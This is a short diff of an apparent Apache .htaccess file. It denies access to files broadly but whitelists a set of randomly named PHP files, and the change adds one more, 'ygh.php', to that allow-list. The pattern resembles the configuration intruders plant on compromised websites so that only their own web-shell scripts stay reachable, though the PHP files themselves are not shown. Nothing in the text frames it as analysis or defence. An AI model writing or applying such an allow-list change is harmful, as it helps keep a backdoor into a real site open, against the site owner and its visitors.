@@ -3,7 +3,7 @@ Order Allow,Deny
 Deny from all
 </FilesMatch>
 Options -Indexes
-<FilesMatch '^(kalj.php|965869.php|lskd.php|il890.php|bahdk.php)$'>
+<FilesMatch '^(kalj.php|965869.php|lskd.php|il890.php|ygh.php|bahdk.php)$'>
  Order allow,deny
  Allow from all
 </FilesMatch>
